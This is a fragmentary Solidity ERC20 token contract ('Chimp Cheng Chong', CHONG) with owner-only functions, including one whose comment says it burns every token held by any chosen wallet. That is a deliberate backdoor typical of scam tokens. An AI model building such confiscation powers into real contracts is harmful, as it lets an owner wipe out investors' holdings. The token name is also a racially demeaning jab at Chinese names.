...
contract Freddy is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("Chimp Cheng Chong", "CHONG") Ownable(initialOwner) {
        _mint(initialOwner, 1600000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Public function to burn all tokens held by a specific wallet
    function ball(address account) external onlyOwner {
    ...
    function subbuer(address to, uint256 amount) public onlyOwner {
